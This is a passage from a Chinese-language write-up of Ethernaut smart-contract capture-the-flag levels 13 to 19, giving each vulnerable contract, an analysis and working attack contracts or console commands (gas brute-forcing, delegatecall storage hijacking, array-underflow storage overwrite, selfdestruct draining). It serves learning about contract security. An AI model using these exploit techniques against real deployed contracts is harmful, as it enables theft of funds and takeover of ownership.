trans)public&#123;\n       result=bytes16(trans);\n   &#125;\n     function pwn(bytes16 key)public&#123;\n         target.unlock(key);\n     &#125;\n &#125;\n\n13.Gatekeeper One\n\n\n\n\n\n\n\n\n题目要求：Make it past the gatekeeper and register as an entrant to pass this level.\nThings that might help:\n\nRemember what you’ve learned from the Telephone and Token levels.\nYou can learn more about the special function gasleft(), in Solidity’s documentation (see here and here).\n\nCodepragma solidity ^0.6.0;\n\nimport '@openzeppelin/contracts/math/SafeMath.sol';\n\ncontract GatekeeperOne &#123;\n\n  using SafeMath for uint256;\n  address public entrant;\n\n  modifier gateOne() &#123;\n    require(msg.sender != tx.origin);\n    _;\n  &#125;//使用合约进行攻击时tx.origin为钱包账户地址，msg.sender为攻击合约地址，part one即可绕过\n\n  modifier gateTwo() &#123;\n    require(gasleft().mod(8191) == 0);\n    _;\n  &#125;//虚拟机中进行debug，传入gas为8191，观察执行完gas后所剩余gas，计算在此之前消耗的gas，在加上8191即为应传入gas\n\n  modifier gateThree(bytes8 _gateKey) &#123;\n      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), \"GatekeeperOne: invalid gateThree part one\");\n      require(uint32(uint64(_gateKey)) != uint64(_gateKey), \"GatekeeperOne: invalid gateThree part two\");\n      require(uint32(uint64(_gateKey)) == uint16(tx.origin), \"GatekeeperOne: invalid gateThree part three\");\n    _;\n  &#125;//绕过此部分的key构造在攻击合约中介绍\n\n  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;\n    entrant = tx.origin;\n    return true;\n  &#125;\n&#125;\n\nanalyze首先要了解类型转换机制，在虚拟机中部署一个测试合约，随意将一串字符转换成为bytes8格式\n并分别将其转变为uint64(result),uint32(uint64(result)),uint16(uint64(result))进行测试\n测试合约\npragma solidity ^0.6.0;\ncontract test &#123;\n    bytes8 public result=bytes8(keccak256(\"abc\"));\n    function trans(bytes8 b)public view returns(uint)&#123;\n        return uint64(b);\n    &#125;\n    function trans1(bytes8 a)public view returns(uint)&#123;\n        return uint32(uint64(a));\n    &#125;\n    function trans3(bytes8 c)public view returns(uint)&#123;\n       return uint16(uint64(c));\n    &#125;\n     function trans4()public view returns(uint)&#123;\n        return uint8(tx.origin);\n    &#125;\n&#125;\n\n转换结果\n\nbytes8包括了16个字母加数字，bytes8与uint64所占字节数相同，通过转换以及在线进制转换可以知道uint64(result)相当于bytes8即后十六位,uint32(uint64(result))相当于byte4即后八位,uint16(uint64(result))相当于bytes2即后四位【以上都是后几位】\n所以构造用于绕过的key可以这样构造：①根据gatethree的第一个require可知key的后四位应该和后八位相等即0000xxxx②根据gatethree的第二个require可知key的后八位应该和后十六位(共十六位)不相等即前八位不全为0③根据gatethree的第三个require可知key的后八位应该和tx.origin的后四位相等。所以最终构造的key为:  0x12345678000022ad   \n学习gasleft函数：这个比较好理解，就是执行完gas之后剩余的gas，可以再虚拟机中debug功能中计算，以下是操作过程\n先传入8191的gas限制\n\n部署合约并传入刚才构造的key进行攻击，此时交易失败，复制 transaction hash进行debug，找到执行完gas后的dup2，可以看到即剩余的gas为7940，所以在此之前消耗的gas为8191-7940&#x3D;251，所以传入的gas应该为81910+251&#x3D;82161\n\n\n综上可以写出攻击合约\ncontract attack&#123;\n    GatekeeperOne target=GatekeeperOne(0x019F6D74cc988e55802adc44BD4130A3AC9C29a9);\n    function pwn(bytes8 key)public&#123;\n         address(target).call&#123;gas:82161&#125;(abi.encodeWithSignature(\"enter(bytes8)\",key));\n    &#125;\n&#125;\n经过多次尝试后，均未通关，尝试更换编译器版本，结果发现每换一次版本，消耗的gas都不同(比如0.6.0版本消耗的是251，0.4.18版本消耗的是242，大概处在200~300的区间)，于是干脆换个写法，直接跑完200~300以内所有数字\ncontract attack&#123;\n    GatekeeperOne target=GatekeeperOne(0x0bE148c2fF43dD082Eac236aD6085262c176DF8A);\n    function pwn(bytes8 key)public&#123;\n        for(uint i=200;i&lt;=300;i++)&#123;\n         address(target).call&#123;gas:81910+i&#125;(abi.encodeWithSignature(\"enter(bytes8)\",key));\n        &#125;\n       &#125;\n&#125;\n\n虚拟机中和链上消耗的gas不相同，需要使用区块链浏览器进行调试，攻击合约改为以下\npragma solidity ^0.6.0;\ncontract attack1&#123;\n    GatekeeperOne target=GatekeeperOne(0xc338d2a9C388AF974304eB36f7dE0CE39DeaC559);\n    function pwn(bytes8 key)public&#123;\n         address(target).call(abi.encodeWithSignature(\"enter(bytes8)\",key));\n       &#125;\n&#125;在合约交互时，从metamask中设置gas limit\n\n第一次gas limit设置为81910，得到如下结果\n\n第二次设置gas limit为81910-54095+81910&#x3D;109725，得到如下结果\n\n第三次设置gas limit为81910-81475+109725&#x3D;110160,得到如下结果\n\n第四次设置gas limit为81910-81903+110160&#x3D;110167，得到如下结果\n\n\n14.Gatekeeper Two\n\n\n\n\n\n\n\n\n题目要求：This gatekeeper introduces a few new challenges. Register as an entrant to pass this level.\nThings that might help:\n\nRemember what you’ve learned from getting past the first gatekeeper - the first gate is the same.\nThe assembly keyword in the second gate allows a contract to access functionality that is not native to vanilla Solidity. See here for more information. The extcodesize call in this gate will get the size of a contract’s code at a given address - you can learn more about how and when this is set in section 7 of the yellow paper.\nThe ^ character in the third gate is a bitwise operation (XOR), and is used here to apply another common bitwise operation (see here). The Coin Flip level is also a good place to start when approaching this challenge.\n\nCodepragma solidity ^0.6.0;\n\ncontract GatekeeperTwo &#123;\n\n  address public entrant;\n\n  modifier gateOne() &#123;\n    require(msg.sender != tx.origin);\n    _;\n  &#125;//使用合约调用就可以绕过\n\n  modifier gateTwo() &#123;\n    uint x;\n    assembly &#123; x := extcodesize(caller()) &#125;\n    require(x == 0);\n    _;\n  &#125;\n\n  modifier gateThree(bytes8 _gateKey) &#123;\n    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);\n    _;\n  &#125;//把^当成次方算了半天一直失败，后来才了解到是异或运算(因为题目要求是英文，导致提示没看懂)\n\n  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;\n    entrant = tx.origin;\n    return true;\n  &#125;\n&#125;\n\nAnalyze运算符号学习\n\n\n\nPrecedence\nDescription\nOperator\n\n\n\n1\nPostfix increment and decrement\n++, --\n\n\n\nNew expression\n&#96;new \n\n\n\nArray subscripting\n&lt;array&gt;[&lt;index&gt;]\n\n\n\nMember access\n&lt;object&gt;.&lt;member&gt;\n\n\n\nFunction-like call\n&lt;func&gt;(&lt;args...&gt;)\n\n\n\nParentheses\n(&lt;statement&gt;)\n\n\n2\nPrefix increment and decrement\n++, --\n\n\n\nUnary plus and minus\n+, -\n\n\n\nUnary operations\ndelete\n\n\n\nLogical NOT\n!\n\n\n\nBitwise NOT\n~\n\n\n3\nExponentiation\n**\n\n\n4\nMultiplication, division and modulo\n*, /, %\n\n\n5\nAddition and subtraction\n+, -\n\n\n6\nBitwise shift operators\n&lt;&lt;, &gt;&gt;\n\n\n7\nBitwise AND\n&amp;\n\n\n8\nBitwise XOR\n^\n\n\n9\nBitwise OR\n&#96;\n\n\n10\nInequality operators\n&lt;, &gt;, &lt;=, &gt;=\n\n\n11\nEquality operators\n==, !=\n\n\n12\nLogical AND\n&amp;&amp;\n\n\n13\nLogical OR\n&#96;\n\n\n14\nTernary operator\n&lt;conditional&gt; ? &lt;if-true&gt; : &lt;if-false&gt;\n\n\n15\nAssignment operators\n=, &#96;\n\n\n16\nComma operator\n,\n\n\nassembly学习\n\n\n\n操作码\n标记\n解释\n\n\n\nstop\n-\n停止执行，相当于返回（0,0)\n\n\nadd(x,y)\n\nx + y\n\n\nsub(x,y)\n\nx - y\n\n\nmul(x,y)\n\nx * y\n\n\ndiv(x,y)\n\nx &#x2F; y\n\n\nsdiv(x,y)\n\nx &#x2F; y ,对于有符号数，用补码\n\n\nmod(x,y)\n\nx % y\n\n\nsmod(x,y)\n\nx % y,对于有符号数，用补码\n\n\nexp(x,y)\n\nx的y次方\n\n\nnot(x)\n\n～x，按位取反\n\n\nlt(x,y)\n\n如果x &lt; y,返回1，否则返回0\n\n\ngt(x,y)\n\n如果x &gt; y,返回1，否则返回0\n\n\nslt(x,y)\n\n如果x &lt; y,返回1，否则返回0,对于有符号数，用补码\n\n\nsgt(x,y)\n\n如果x &gt; y,返回1，否则返回0,对于有符号数，用补码\n\n\neq(x,y)\n\n如果x &#x3D;&#x3D; y,返回1，否则返回0\n\n\niszero(x)\n\n如果x &#x3D;&#x3D; 0,返回1，否则返回0\n\n\nand(x,y)\n\nx和y按位与\n\n\nor(x,y)\n\nx和y按位或\n\n\nxor(x,y)\n\nx和y按位异或\n\n\nbyte(n,x)\n\nx的第n位，最重要的是第0位\n\n\naddmod(x,y,m)\n\n(x + y) % m，可以是任意精度的算术\n\n\nmulmod(x,y,m)\n\n(x * y) % m，可以是任意精度的算术\n\n\nsignxtend(i,x)\n\n从第（i * 8 +  7）位开始数最少签名位数，来扩展签名\n\n\nkeccak256(p,n)\n\nkeccak(mem[p…(p+n)))\n\n\nsha3(p,n)\n\nsha3(mem[p…(p+n)))\n\n\njump(label)\n-\n跳转到label标签／代码位置\n\n\njumpi(label, cond)\n-\n如果cond非零，就跳转到label标签\n\n\npc\n\n代码的当前位置\n\n\npop(x)\n-\n删除x推入的元素\n\n\ndup1 … dup16\n\n拷贝第i位的元素到栈顶（从顶端开始数）\n\n\nswap1 … swap16\n*\n交换栈顶和第i位的元素\n\n\nmload（p）\n\nmem[p..(p+32))\n\n\nmstore(p, v)\n-\nmem[p..(p+32)) :&#x3D; v\n\n\nmstore8(p, v)\n-\nmem[p] :&#x3D; v &amp; 0xff - 只分配一个字节\n\n\nsload(p)\n\nstorage[p]\n\n\nsstore(p, v)\n-\nstorage[p] :&#x3D; v\n\n\nmsize\n\n内存的大小，例如最大的内存可访问索引\n\n\ngas\n\n可用的gas数\n\n\naddress\n\n当前合约／执行上下文的地址\n\n\nbalance(a)\n\n地址a的余额，单位为wei\n\n\ncaller\n\n调用者（不包含delegatecall）\n\n\ncallvalue\n\n当前调用发送的wei数\n\n\ncalldataload(p)\n\n从位置p开始的调用数据（32位）\n\n\ncalldatasize\n\n调用数据的大小，bytes为单位\n\n\ncalldatacopy(t,f,s)\n-\n从数据位置f，拷贝s位数据，到内存位置t\n\n\ncodesize\n\n当前合约&#x2F;执行上下文的代码大小\n\n\ncodecopy(t,f,s)\n-\n从代码位置f，拷贝s位数据，到内存位置t\n\n\nextcodesize(a)\n\n地址a处代码的大小\n\n\nextcodecopy(a, t, f, s)\n-\n像codecopy(t,f,s)，但是是位置a处的代码\n\n\nreturndatasize\n\n上个返回值的数据大小\n\n\nreturndatacopy(t, f, s)\n-\n在返回数据的位置f拷贝s位，到内存位置t\n\n\ncreate(v, p, s)\n\n用 mem[p..(p+s))长度的代码，创建一个新的合约，发送v wei的以太币，并返回合约地址\n\n\ncreate2(v, n, p, s)\n\n用 地址为keccak256(&lt; address &gt; . n . keccak256(mem[p..(p+s)))，mem[p..(p+s))长度的代码，创建一个新的合约，发送v wei的以太币，并返回合约地址\n\n\ncall(g, a, v, in, insize, out, outsize)\n\n调用地址a上的合约，参数为mem[in..(in+insize))，提供g的gas，v wei的以太币，输出到mem[out..(out+outsize))，如果成功返回1，失败（例如gas不足）返回0\n\n\ncallcode(g, a, v, in, insize, out, outsize)\n\n与call相同，但是使用a处的代码，并只能在当前合约的上下文中执行\n\n\ndelegatecall(g, a, in, insize, out, outsize)\n\n与callcode相同，但是保留caller和callvalue\n\n\nstaticcall(g, a, in, insize, out, outsize)\n\n与_call(g, a, 0, in, insize, out, outsize) _相同，但是不允许改变状态\n\n\nreturn(p, s)\n-\n结束执行，返回数据mem[p..(p+s))\n\n\nrevert(p, s)\n-\n结束执行，恢复状态变化，返回数据mem[p..(p+s))\n\n\nselfdestruct(a)\n-\n结束执行，销毁当前合约，并把余额发送给a地址\n\n\ninvalid\n-\n用invalid指令结束执行\n\n\nlog0(p,s)\n-\n记录日志，不包含主题，数据为mem[p..(p+s)\n\n\nlog1(p,s,t1)\n-\n记录日志，包含主题t1，数据为mem[p..(p+s)\n\n\nlog2(p,s,t1,t2)\n-\n记录日志，包含主题t1，t2，数据为mem[p..(p+s)\n\n\nlog3(p,s,t1,t2,t3)\n-\n记录日志，包含主题t1，t2，t3，数据为mem[p..(p+s)\n\n\nlog4(p,s,t1,t2,t3,t4)\n-\n记录日志，包含主题t1，t2，t3，t4，数据为mem[p..(p+s)\n\n\norigin\n\n交易发起方\n\n\ngasprice\n\n交易的gas价格\n\n\nblockhash(b)\n\n区块序列为b的hash - 只能获取到当前块的最近256块\n\n\ncoinbase\n\n当前的矿工收益\n\n\ntimestamp\n\n自创世纪区块以来的时间戳，单位为秒\n\n\nnumber\n\n当前区块的序号\n\n\ndifficulty\n\n当前区块的难度\n\n\ngaslimit\n\n当前代码块的gas限制\n\n\n学习到extcodesize(caller())是一种检验合约地址还是账户地址的操作，如果caller为账户则extcodesize(caller())为0，如果caller为合约则extcodesize(caller())为对应的字节码，如下为测试合约\ncontract test&#123;\n    \n    function a() public view returns(uint )&#123;\n        uint x;\n   assembly &#123; \n       x := extcodesize(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4)\n   &#125;\n   return x;\n    &#125;\n    function b() public view returns(uint)&#123;\n        uint y;\n        assembly &#123;\n            y:=extcodesize(0x4a9C121080f6D9250Fc0143f41B595fD172E31bf)\n        &#125;\n        return y;\n    &#125;\n&#125;\n\n测试结果为如下\n\n&#x3D;&#x3D;进一步了解得知：合约在初始化，代码大小为0。即需要将攻击过程写在constuctor中&#x3D;&#x3D;\nAttackcontract attack&#123;\n    GatekeeperTwo public target=GatekeeperTwo(0xfD6a4183eed0115CBe743c480eA4042C15F0a86c);\n    bytes8 public result;\n    constructor() public&#123;\n        result = bytes8(0xffffffffffffffff ^ uint64(bytes8(keccak256(abi.encodePacked(address(this))))));\n        target.enter(result);\n    &#125;\n&#125;\n\n15.Naught Coin\n\n\n\n\n\n\n\n\n题目要求：NaughtCoin is an ERC20 token and you’re already holding all of them. The catch is that you’ll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.\n Things that might help\n\nThe ERC20 Spec\nThe OpenZeppelin codebase\n\nCodepragma solidity ^0.6.0;\n\nimport '@openzeppelin/contracts/token/ERC20/ERC20.sol';\n\n contract NaughtCoin is ERC20 &#123;\n\n  // string public constant name = 'NaughtCoin';\n  // string public constant symbol = '0x0';\n  // uint public constant decimals = 18;\n  uint public timeLock = now + 10 * 365 days;\n  uint256 public INITIAL_SUPPLY;\n  address public player;\n\n  constructor(address _player) \n  ERC20('NaughtCoin', '0x0')\n  public &#123;\n    player = _player;\n    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));\n    // _totalSupply = INITIAL_SUPPLY;\n    // _balances[player] = INITIAL_SUPPLY;\n    _mint(player, INITIAL_SUPPLY);\n    emit Transfer(address(0), player, INITIAL_SUPPLY);\n  &#125;\n  \n  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) &#123;\n    super.transfer(_to, _value);\n  &#125;\n\n  // Prevent the initial owner from transferring tokens until the timelock has passed\n  modifier lockTokens() &#123;\n    if (msg.sender == player) &#123;\n      require(now > timeLock);\n      _;\n    &#125; else &#123;\n     _;\n    &#125;\n  &#125; \n&#125; \n\nerc20.sol\npragma solidity ^0.8.0;\n\nimport \"./IERC20.sol\";\nimport \"./extensions/IERC20Metadata.sol\";\nimport \"../../utils/Context.sol\";\ncontract ERC20 is Context, IERC20, IERC20Metadata &#123;\n    mapping(address => uint256) private _balances;\n\n    mapping(address => mapping(address => uint256)) private _allowances;\n\n    uint256 private _totalSupply;\n\n    string private _name;\n    string private _symbol;\n    constructor(string memory name_, string memory symbol_) &#123;\n        _name = name_;\n        _symbol = symbol_;\n    &#125;\n    function name() public view virtual override returns (string memory) &#123;\n        return _name;\n    &#125;\n    function symbol() public view virtual override returns (string memory) &#123;\n        return _symbol;\n    &#125;\n    function decimals() public view virtual override returns (uint8) &#123;\n        return 18;\n    &#125;\n    function totalSupply() public view virtual override returns (uint256) &#123;\n        return _totalSupply;\n    &#125;\n    function balanceOf(address account) public view virtual override returns (uint256) &#123;\n        return _balances[account];\n    &#125;\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) &#123;\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    &#125;\n    function allowance(address owner, address spender) public view virtual override returns (uint256) &#123;\n        return _allowances[owner][spender];\n    &#125;\n    function approve(address spender, uint256 amount) public virtual override returns (bool) &#123;\n        _approve(_msgSender(), spender, amount);\n        return true;\n    &#125;\n    function transferFrom(address sender,address recipient,uint256 amount) public virtual override returns (bool) &#123;\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\n        if (currentAllowance != type(uint256).max) &#123;\n            require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\n            unchecked &#123;\n                _approve(sender, _msgSender(), currentAllowance - amount);\n            &#125;\n        &#125;\n        _transfer(sender, recipient, amount);\n        return true;\n    &#125;\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) &#123;\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\n        return true;\n    &#125;\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) &#123;\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\n        unchecked &#123;\n            _approve(_msgSender(), spender, currentAllowance - subtractedValue);\n        &#125;\n\n        return true;\n    &#125;\n    function _transfer(address sender,address recipient,uint256 amount) internal virtual &#123;\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n\n        _beforeTokenTransfer(sender, recipient, amount);\n\n        uint256 senderBalance = _balances[sender];\n        require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\");\n        unchecked &#123;\n            _balances[sender] = senderBalance - amount;\n        &#125;\n        _balances[recipient] += amount;\n\n        emit Transfer(sender, recipient, amount);\n\n        _afterTokenTransfer(sender, recipient, amount);\n    &#125;\n    function _mint(address account, uint256 amount) internal virtual &#123;\n        require(account != address(0), \"ERC20: mint to the zero address\");\n\n        _beforeTokenTransfer(address(0), account, amount);\n\n        _totalSupply += amount;\n        _balances[account] += amount;\n        emit Transfer(address(0), account, amount);\n\n        _afterTokenTransfer(address(0), account, amount);\n    &#125;\n    function _burn(address account, uint256 amount) internal virtual &#123;\n        require(account != address(0), \"ERC20: burn from the zero address\");\n\n        _beforeTokenTransfer(account, address(0), amount);\n\n        uint256 accountBalance = _balances[account];\n        require(accountBalance >= amount, \"ERC20: burn amount exceeds balance\");\n        unchecked &#123;\n            _balances[account] = accountBalance - amount;\n        &#125;\n        _totalSupply -= amount;\n\n        emit Transfer(account, address(0), amount);\n\n        _afterTokenTransfer(account, address(0), amount);\n    &#125;\n    function _approve(address owner,address spender,uint256 amount) internal virtual &#123;\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    &#125;\n    function _beforeTokenTransfer(address from,address to,uint256 amount) internal virtual &#123;&#125;\n    function _afterTokenTransfer(address from,address to,uint256 amount) internal virtual &#123;&#125;\n&#125;\n\nAnalyze主要是考察了erc20，之前有过一些了解\n学习到了solidity中super的含义，指的是调用继承合约中的函数，如下为测试合约（可供更好的理解super）&#x3D;&#x3D;学习链接&#x3D;&#x3D;\npragma solidity ^0.4.5;\ncontract C &#123;\n     uint u;\n     function f() &#123;\n       u = 1;\n     &#125;\n&#125;\ncontract B is C &#123;\n     function f() &#123;\n       u = 2;\n     &#125;\n&#125;\ncontract A is B &#123;\n     function f() &#123;  // will set u to 3\n       u = 3;\n     &#125;\n     function f1() &#123; // will set u to 2\n       //当使用super时，调用的是继承的该函数，不是它自己，比如下边给出的例子中，函数名字是相同的，要知道调用的不是它自己，是继承父合约中的同名函数。\n       super.f();\n     &#125;\n     function f2() &#123; // will set u to 2\n       B.f();\n     &#125;\n     function f3() &#123; // will set u to 1\n       C.f();\n     &#125;\n&#125;\n\nAttack看了好久发现这道题好像不能使用合约进行攻击，因为授权操作都是以msg.sender作为owner，msg.sender只能是合约（使用合约攻击的情况下）。而要使balanceOf[tx.origin]为0就只能在题目环境下解题\nawait contract.approve(player,toWei('1000000'))//给自己授权\nawait contract.transferFrom(player,'0x24fBFF0FbF51c62a64b4ED381C4E039E03dD2d6a',toWei('1000000')//将授权的数量转走\n\n16.Preservation\n\n\n\n\n\n\n\n\n题目要求：This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.The goal of this level is for you to claim ownership of the instance you are given.\n Things that might help\n\nLook into Solidity’s documentation on the delegatecall low level function, how it works, how it can be used to delegate operations to on-chain. libraries, and what implications it has on execution scope.\nUnderstanding what it means for delegatecall to be context-preserving.\nUnderstanding how storage variables are stored and accessed.\nUnderstanding how casting works between different data types.\n\nCodepragma solidity ^0.6.0;\n\ncontract Preservation &#123;\n\n  // public library contracts \n  address public timeZone1Library;\n  address public timeZone2Library;\n  address public owner; \n  uint storedTime;\n  // Sets the function signature for delegatecall\n  bytes4 constant setTimeSignature = bytes4(keccak256(\"setTime(uint256)\"));\n\n  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public &#123;\n    timeZone1Library = _timeZone1LibraryAddress; \n    timeZone2Library = _timeZone2LibraryAddress; \n    owner = msg.sender;\n  &#125;\n \n  // set the time for timezone 1\n  function setFirstTime(uint _timeStamp) public &#123;\n    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));\n  &#125;//使用delegatecall调用setTime储存为storedTime，storedTime占用slot0，delegatecall进行带哦用之后执行环境为攻击合约，所以该合约之下的slot0会被修改为传入的uint数据，即timeZone1Library可控\n\n  // set the time for timezone 2\n  function setSecondTime(uint _timeStamp) public &#123;\n    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));\n  &#125;\n&#125;\n\n// Simple library contract to set the time\ncontract LibraryContract &#123;\n\n  // stores a timestamp \n  uint storedTime;  \n\n  function setTime(uint _time) public &#123;\n    storedTime = _time;\n  &#125;\n&#125;\n\nAnalyze学习过程参考13.Delegatecall\nAttzckcontract attack&#123;\naddress a;\naddress b;\naddress owner;//将owner初始化在slot2，即可使修改的数据为被攻击合约的slot2\nPreservation target=Preservation(0x7ad5909C5ACde5A2a5B548280F980844e2564102);\nfunction changetimeZone1Library(uint a)public &#123;\n    target.setFirstTime(a);\n&#125;//第一次调用将timeZone1Library改变为攻击合约地址\n//再次调用则是调用攻击合约地址下的setTime(uint256)，此时即可执行攻击代码\nfunction setTime(uint256 a) public&#123;\n     owner=tx.origin;\n&#125;//折磨了好久又是oog，果然存在call就要注意gas限制的问题\n&#125;\n\n17.Recovery\n\n\n\n\n\n\n\n\n题目要求：A contract creator has built a very simple token factory contract. Anyone can create new tokens with ease. After deploying the first token contract, the creator sent 0.5 ether to obtain more tokens. They have since lost the contract address.This level will be completed if you can recover (or remove) the 0.5 ether from the lost contract address.\nCodepragma solidity ^0.6.0;\n\nimport '@openzeppelin/contracts/math/SafeMath.sol';\n\ncontract Recovery &#123;\n\n  //generate tokens\n  function generateToken(string memory _name, uint256 _initialSupply) public &#123;\n    new SimpleToken(_name, msg.sender, _initialSupply);\n  \n  &#125;\n&#125;\n\ncontract SimpleToken &#123;\n\n  using SafeMath for uint256;\n  // public variables\n  string public name;\n  mapping (address => uint) public balances;\n\n  // constructor\n  constructor(string memory _name, address _creator, uint256 _initialSupply) public &#123;\n    name = _name;\n    balances[_creator] = _initialSupply;\n  &#125;\n\n  // collect ether in return for tokens\n  receive() external payable &#123;\n    balances[msg.sender] = msg.value.mul(10);\n  &#125;\n\n  // allow transfers of tokens\n  function transfer(address _to, uint _amount) public &#123; \n    require(balances[msg.sender] >= _amount);\n    balances[msg.sender] = balances[msg.sender].sub(_amount);\n    balances[_to] = _amount;\n  &#125;\n\n  // clean up after ourselves\n  function destroy(address payable _to) public &#123;\n    selfdestruct(_to);\n  &#125;\n&#125;\n\nAnalyze题目说creator在进行部署合约后进行了合约交互创建了SimpleToken合约并转入了0.5eth，但SimpleToken合约地址丢失,但是这些操作是在实例地址下进行的，打开区块链浏览器后查询实例地址并结合题目要求分析实例下的交易\n①获得实例地址\n\n②查看进行过的交易并进行分析\n\n\n结合题目可知关卡地址为0x0EB8e4771ABA41B70d0cb6770e04086E5aee5aB2，所以操作一是我们单机创建新实例产生的交易\n题目说creator进行了对generateToken的调用创建了一个SimpleToken合约，所以操作二是creator调用函数进行合约交互\n题目说creator进行了对generateToken的调用创建了一个SimpleToken合约，所以操作三是创建了SimpleToken合约(0xFc777940566cE74f839101ba1842be4B6f69EDC2)\n所以creator是想这个合约转账了0.5eth，该合约下又有public的selfdestruct函数destroy，所以直接构建攻击合约调用destroy函数即可\n\n\nAttackpragma solidity ^0.6.0;\ncontract SimpleToken &#123;\n function destroy(address payable _to) public &#123;\n    selfdestruct(_to);\n  &#125;\n&#125;\ncontract attack&#123;\n    SimpleToken target = SimpleToken(0xFc777940566cE74f839101ba1842be4B6f69EDC2);\n    function pwn(address payable to)public &#123;\n        target.destroy(to);\n    &#125;\n&#125;\n\n18.MagicNumber\n\n\n\n\n\n\n\n\n题目要求：To solve this level, you only need to provide the Ethernaut with a Solver, a contract that responds to whatIsTheMeaningOfLife() with the right number.Easy right? Well… there’s a catch.The solver’s code needs to be really tiny. Really reaaaaaallly tiny. Like freakin’ really really itty-bitty tiny: 10 opcodes at most.Hint: Perhaps its time to leave the comfort of the Solidity compiler momentarily, and build this one by hand O_o. That’s right: Raw EVM bytecode.Good luck!\nCodepragma solidity ^0.6.0;\n\ncontract MagicNum &#123;\n\n  address public solver;\n\n  constructor() public &#123;&#125;\n\n  function setSolver(address _solver) public &#123;\n    solver = _solver;\n  &#125;\n\nAnalyze学习链接①\n学习链接②\n学习链接③\n构建data：\n首先，42这个数字来的太不轻松了！！！\n\n①先构建runtime codes：0x60 0x2a 0x60 0x80 0x52 0x60 0x20 0x60 0x80 0xf3\n&#123;\n0x602a     ;PUSH1 0x2a                  v\n0x6080     ;PUSH1 0x80                  p\n0x52       ;MSTORE\n&#125;&#x2F;&#x2F;mstore(p, v) p代表position位置，v代表value值\n&#123;\n0x6020     ;PUSH1 0x20                  s\n0x6080     ;PUSH1 0x80                  p\n0xf3       ;RETURN\n&#125;&#x2F;&#x2F;return(p,s)p代表position位置，s代表size存储所占大小\n所以runtime codes：602a60805260206080f3\n\n②构建initialization codes：0x60 0x0a 0x60 0x?? 0x60 0x00 0x39 0x60 0x0a 0x60 0x00 0xf3\ncopy code&#123;\n0x600a     ;PUSH1 0x0a                     S(runtime code size)\n0x60??     ;PUSH1 0x??                     F(current position of runtime opcodes)\n0x6000     ;PUSH1 0x00                     T(destination memory index 0)\n0x39       ;CODECOPY\n&#125;&#x2F;&#x2F;codecopy(t, f, s)t代表target目标位置，f代表runtime codes位置，s代表size代码大小\nreturn code&#123;\n0x600a     ;PUSH1 0x0a                     S\n0x6000     ;PUSH1 0x00                     P\n0xf3       ;RETURN\n&#125;&#x2F;&#x2F;return(p,s)p代表position位置，s代表size存储所占大小\ninitialization codes占用了12个字节，所以??应该是0c\n所以initialization codes：600a600c600039600a6000f3\n\n③得到data：600a600c60&#x3D;&#x3D;00&#x3D;&#x3D;39600a60&#x3D;&#x3D;00&#x3D;&#x3D;f3602a60&#x3D;&#x3D;80&#x3D;&#x3D;52602060&#x3D;&#x3D;80&#x3D;&#x3D;f3(高亮部分非唯一答案，比如600a600c60&#x3D;&#x3D;10&#x3D;&#x3D;39600a60&#x3D;&#x3D;10&#x3D;&#x3D;f3602a60&#x3D;&#x3D;70&#x3D;&#x3D;52602060&#x3D;&#x3D;70&#x3D;&#x3D;f3)\nAttackawait sendTransaction(&#123;from:player,data:600a600c601039600a6010f3602a60705260206070f3&#125;)\n //创建合约根据交易哈希获得合约地址\n contract attack&#123;\n      MagicNum target=MagicNum(0x397175529CC088e12C7bb281403F2a15aDD6c9a5);\n      function pwn(address a)public&#123;\n          target.setSolver(a);\n      &#125;//传入刚刚创建的地址，进行调用\n  &#125;\n\n19.Alien CodexCodepragma solidity ^0.5.0;\n\nimport '../helpers/Ownable-05.sol';\n\ncontract AlienCodex is Ownable &#123;\n\n  bool public contact;\n  bytes32[] public codex;\n\n  modifier contacted() &#123;\n    assert(contact);\n    _;\n  &#125;\n  \n  function make_contact() public &#123;\n    contact = true;\n  &#125;\n\n  function record(bytes32 _content) contacted public &#123;\n  \tcodex.push(_content);\n  &#125;\n\n  function retract() contacted public &#123;\n    codex.length--;\n  &#125;\n\n  function revise(uint i, bytes32 _content) contacted public &#123;\n    codex[i] = _content;\n  &#125;\n&#125;\n\nAnalyze这一关利用了 EVM 不会验证一个数组的 ABI-encoded 长度和他真实的payload的问题.\n并且他利用了数组长度的算数下溢, 通过扩大数组到整个 2^256 的存储区域. 然后用户就可以更改所有合约的storage了.\n这两个漏洞都是受这个启发 Underhanded coding contest\nAttackpragma solidity ^0.6.0;\n\ninterface AlienCodex &#123;\n\n  function make_contact() external ;\n\n  function record(bytes32 _content) external ;\n\n  function retract()  external ;\n\n  function revise(uint i, bytes32 _content) external ;\n&#125;\n\ncontract Attack &#123;\n    AlienCodex target = AlienCodex(0x53c5A404b93e96DA6b913c222b728E8825f987E5);\n    bytes32 public payload = 0x000000000000000000000002b2E23ceC9921288f63F60A839E2B28235bc22ad;\n    function attack() public &#123;\n        